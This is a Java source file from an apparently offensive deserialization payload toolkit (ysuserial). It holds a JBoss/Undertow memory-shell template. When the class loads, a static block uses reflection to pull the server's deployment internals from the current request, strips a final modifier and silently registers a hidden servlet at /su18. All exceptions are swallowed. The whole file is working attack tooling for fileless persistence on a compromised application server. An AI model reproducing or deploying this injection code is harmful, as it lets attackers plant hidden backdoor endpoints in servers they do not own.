package org.su18.ysuserial.payloads.templates.memshell.jboss;

import io.undertow.servlet.api.DeploymentInfo;
import io.undertow.servlet.api.ServletInfo;
import io.undertow.servlet.core.DeploymentImpl;
import io.undertow.servlet.handlers.ServletHandler;
import io.undertow.servlet.spec.HttpServletRequestImpl;
import io.undertow.servlet.spec.ServletRegistrationImpl;
import io.undertow.servlet.util.ConstructorInstanceFactory;

import javax.security.jacc.PolicyContext;
import javax.servlet.*;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Map;

/**
 * @author su18
 */
public class JBSMSFromContext implements Servlet {

	static {
		try {
			String servletName = "su18" + System.nanoTime();
			String urlPattern  = "/su18";

			HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
			ServletContext         context = request.getServletContext();
			Field                  f       = context.getClass().getDeclaredField("deploymentInfo");
			f.setAccessible(true);
			DeploymentInfo deploymentInfo = (DeploymentInfo) f.get(context);

			//只添加一次
			Map<String, ServletInfo> servlets = deploymentInfo.getServlets();
			if (!servlets.containsKey(servletName)) {

				Class       clazz       = JBSMSFromContext.class;
				ServletInfo servletInfo = new ServletInfo(servletName, clazz, new ConstructorInstanceFactory<Servlet>(clazz.getDeclaredConstructor()));
				deploymentInfo.addServlet(servletInfo);

				f = context.getClass().getDeclaredField("deployment");
				f.setAccessible(true);
				Field modifiersField = Field.class.getDeclaredField("modifiers");
				modifiersField.setAccessible(true);
				modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
				DeploymentImpl deployment = (DeploymentImpl) f.get(context);
				ServletHandler handler    = deployment.getServlets().addServlet(servletInfo);

				ServletRegistrationImpl registration = new ServletRegistrationImpl(servletInfo, handler.getManagedServlet(), deployment);
				registration.addMapping(urlPattern);
			}
		} catch (Exception ignored) {
		}
	}

	@Override
	public void init(ServletConfig servletConfig) throws ServletException {
	}

	@Override
	public ServletConfig getServletConfig() {
		return null;
	}

	@Override
	public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
	}

	@Override
	public String getServletInfo() {
		return null;
	}

	@Override
	public void destroy() {
	}
}